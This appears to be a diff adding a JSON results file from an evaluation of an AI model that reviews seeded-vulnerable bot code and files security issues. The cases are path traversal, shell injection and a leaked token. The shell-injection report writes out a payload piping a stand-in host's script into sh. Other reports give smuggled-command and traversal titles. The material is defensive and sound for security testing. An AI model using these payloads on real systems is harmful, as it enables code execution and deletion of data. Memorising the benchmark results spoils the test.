@@ -1,0 +1,93 @@
+{
+  "model": "claude-opus-5-5",
+  "effort": "medium",
+  "at": "2026-10-30T16:08:15.882Z",
+  "vulnsFound": 3,
+  "vulns": 3,
+  "falseAlarms": 0,
+  "cleanCases": 1,
+  "noComment": 0,
+  "tokensPerPass": 65540,
+  "secondsPerPass": 40,
+  "results": [
+    {
+      "case": "clean",
+      "vuln": null,
+      "done": true,
+      "found": null,
+      "signedOff": true,
+      "commented": true,
+      "correct": true,
+      "filed": [],
+      "ghCalls": 5,
+      "ms": 42128,
+      "tokens": 66220
+    },
+    {
+      "case": "rmsync",
+      "vuln": "path traversal + unsafe deletion: a title like '../../..' makes cleanScratch rmSync a directory outside scratch/ (src/scratch.js)",
+      "done": true,
+      "found": true,
+      "signedOff": false,
+      "commented": true,
+      "correct": true,
+      "filed": [
+        {
+          "title": "security: issue title path traversal lets cleanScratch rmSync arbitrary directories",
+          "labels": [
+            "ready-for-agent",
+            "security"
+          ],
+          "body": "## Vulnerable location\n`src/scratch.js:10` — `scratchDir()` builds the path as `path.join(ROOT, it.title.trim().toLowerCase().replace(/\\s+/g, '-'))`. The issue title is attacker-controlled GitHub text and only whitespace is replaced, so `/`, `\\` and `..` segments pass through unchanged.\n\n`src/scratch.js:21` — `cleanScratch()` then calls `rmSync(<that path>, { recursive: true, force: true })`. `src/scratch.js:15` — `makeScratch()` calls `mkdirSync` on the same path.\n\n## Exploit scenario\nAnyone who can open (or edit the title of) an issue sets its title to `../..` (or `../../../home/runner`, `..\\..\\src`, `.`, `..`). `path.join` normalizes it to a directory outside `scratch/`, e.g. the checkout's parent or the user's home. When the bot runs `cleanScratch(repo, n)` after the issue closes, it recursively deletes that directory, with `force: true` suppressing errors. A title of `.` deletes the whole `scratch/` root, which wipes every other issue's scratch directory. `makeScratch` can also create directories anywhere the process can write.\n\n## Acceptance criteria\n- The directory name comes from the issue **number** (e.g. `scratch/<n>-<slug>`), and any slug drawn from the title is restricted to `[a-z0-9-]`, with `.`, `/` and `\\` removed or replaced, and non-empty fallback handling.\n- `scratchDir` resolves the final path and asserts that it is a strict descendant of `ROOT` (`path.relative(ROOT, dir)` is non-empty, does not start with `..` and is not absolute), throwing an error otherwise. `cleanScratch` and `makeScratch` never touch a path that fails this check.\n- Add a test (`node --test`) that stubs `issue()` to return titles `../..`, `..`, `.`, `../../etc`, `..\\..\\x` and `/abs/path`, and asserts that `scratchDir` stays inside `ROOT` (or throws) and that `cleanScratch` deletes nothing outside `ROOT`. Against the current code the test fails because `scratchDir` returns a path outside `scratch/` for `../..`.\n\n## Blocked by\nNone\n\n## Parent\n#1\n"
+        }
+      ],
+      "ghCalls": 3,
+      "ms": 39901,
+      "tokens": 57989
+    },
+    {
+      "case": "shell",
+      "vuln": "command injection: the issue title is interpolated into an execSync shell command (src/snapshot.js)",
+      "done": true,
+      "found": true,
+      "signedOff": false,
+      "commented": true,
+      "correct": true,
+      "filed": [
+        {
+          "title": "security: shell injection via issue title in snapshot commit",
+          "labels": [
+            "ready-for-agent",
+            "security"
+          ],
+          "body": "## Vulnerability\n`src/snapshot.js:9` builds a shell command by string interpolation and runs it with `execSync`:\n\n```js\nexecSync(`git add snapshots && git commit -q -m \"snapshot #${n}: ${it.title}\"`, { cwd });\n```\n\n`it.title` is the GitHub issue title — attacker-controlled by anyone who can open or edit an issue. It reaches `/bin/sh` (or `cmd.exe`) unescaped.\n\n## Exploit scenario\nAn attacker opens an issue titled:\n\n```\nx$(curl -s https://evil.example/p.sh | sh)\n```\n\nor `x\"; curl -s https://evil.example/p.sh | sh; echo \"`. When the bot runs `snapshot(repo, n)`, the shell executes the payload with the bot's credentials (gh token, push rights) in `cwd`.\n\n## Fix\nRun git without a shell, passing the message as an argv element, e.g.:\n\n```js\nexecFileSync('git', ['add', 'snapshots'], { cwd });\nexecFileSync('git', ['commit', '-q', '-m', `snapshot #${n}: ${it.title}`], { cwd });\n```\n\n## Acceptance criteria\n- [ ] `src/snapshot.js` invokes no shell with GitHub-derived text (no `execSync`/`exec`/`shell: true` with interpolated title/body).\n- [ ] The commit message equals `snapshot #<n>: <title>` literally, for any title.\n- [ ] New test under `test/` (run by `npm test`) that fails before the fix: in a temp git repo with a `snapshots/` dir, put a fake `gh` first on `PATH` that prints `{\"number\":7,\"title\":\"x$(touch PWNED)\\\"; touch PWNED2; echo \\\"\",\"body\":\"b\"}`; call `snapshot('o/r', 7, tmp)`; assert neither `PWNED` nor `PWNED2` exists in `tmp` and `git log -1 --format=%s` equals the literal message.\n\n## Blocked by\nNone\n\n## Parent\n#1\n"
+        }
+      ],
+      "ghCalls": 5,
+      "ms": 38144,
+      "tokens": 81255
+    },
+    {
+      "case": "token",
+      "vuln": "secret in a log: the Authorization header with GH_TOKEN is written to issuebot-debug.log (src/api.js)",
+      "done": true,
+      "found": true,
+      "signedOff": false,
+      "commented": true,
+      "correct": true,
+      "filed": [
+        {
+          "title": "security: GH_TOKEN written in plaintext to issuebot-debug.log",
+          "labels": [
+            "ready-for-agent",
+            "security"
+          ],
+          "body": "## Vulnerable location\n`src/api.js:10`, from commit 7f0b802 (closes #2):\n\n```js\nconst headers = { Authorization: `Bearer ${token}`, Accept: 'application/vnd.github+json' };\nappendFileSync(LOG, `${new Date().toISOString()} GET ${url} ${JSON.stringify(headers)}\\n`);\n```\n\nEvery call to `api()` writes the full `Authorization: Bearer <GH_TOKEN>` header to `issuebot-debug.log` in plaintext. The log goes to the current working directory, which is usually the repo root, and `.gitignore` does not exclude it because the repo has no `.gitignore`.\n\n## Exploit scenario\n1. An agent or developer runs anything that calls `api('/repos/o/r/issues')`, and the log now contains `\"Authorization\":\"Bearer ghp_...\"`.\n2. A later `git add -A` / `git commit -a` in that checkout commits `issuebot-debug.log` and pushes it. Agents in this pipeline do this routinely. The token is now public in the repo history.\n3. Even without a commit, anyone who can read the log can take the token: CI artifacts, shared machines, logs attached to bug reports. This is exactly the file people will paste when \"a GitHub call fails\".\n\n## Acceptance criteria\n- [ ] The debug log never contains the token or the `Authorization` header value. Log only the method, the URL, and the status, or replace the header value with a redaction such as `Bearer ***`.\n- [ ] Add `issuebot-debug.log` to `.gitignore`.\n- [ ] Add a test (`node --test`) that sets `GH_TOKEN=test-secret-123`, stubs `globalThis.fetch`, and calls `api('/x')`. It then asserts that `issuebot-debug.log` does not contain `test-secret-123`. This test fails on current `main`.\n\n## Blocked by\nNone\n\n## Parent\n#1\n"
+        }
+      ],
+      "ghCalls": 3,
+      "ms": 38198,
+      "tokens": 56694
+    }
+  ]
+}
